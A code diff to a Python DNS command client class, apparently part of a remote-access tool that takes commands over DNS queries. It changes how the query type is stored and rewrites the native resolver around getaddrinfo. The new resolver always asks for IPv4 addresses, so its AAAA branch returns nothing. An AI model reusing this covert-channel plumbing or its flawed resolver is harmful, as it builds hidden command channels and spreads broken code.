@@ -90,8 +90,9 @@ class DnsCommandsClient(Thread):
             self.cid = 31337
 
         self.iid = os.getpid() % 65535
+        self.qtype = qtype
 
-        if ns and dnslib:
+        if (ns or self.qtype not in ('A', 'AAAA')) and dnslib:
             if not type(ns) in (list, tuple):
                 ns = ns.split(':')
                 if len(ns) == 1:
@@ -106,7 +107,6 @@ class DnsCommandsClient(Thread):
             self.ns_socket = None
             self.ns_timeout = ns_timeout
             self.ns_socket_lock = Lock()
-            self.qtype = qtype
             self.resolve = self._dnslib_resolve
         else:
             if ns:
@@ -114,7 +114,6 @@ class DnsCommandsClient(Thread):
 
             self.ns = None
             self.ns_socket = None
-            self.qtype = None
             self.ns_timeout = None
             self.resolve = self._native_resolve
 
@@ -160,8 +159,22 @@ class DnsCommandsClient(Thread):
         self.event(CustomEvent(eventid))
 
     def _native_resolve(self, hostname):
-        _, _, addresses = socket.gethostbyname_ex(hostname)
-        return addresses
+        family = None
+
+        if self.qtype == 'A':
+            family = socket.AF_INET
+        elif self.qtype == 'AAAA':
+            family = socket.AF_INET6
+        else:
+            raise NotImplementedError(
+                '{} is not supported by native resolver'.format(self.qtype)
+            )
+
+        return [
+            host for af_family, _, _, _, (host, _) in socket.getaddrinfo(
+                hostname, 80, socket.AF_INET, socket.IPPROTO_TCP
+            ) if af_family == family
+        ]
 
     def _dnslib_resolve(self, hostname):
         q = dnslib.DNSRecord.question(hostname, self.qtype)
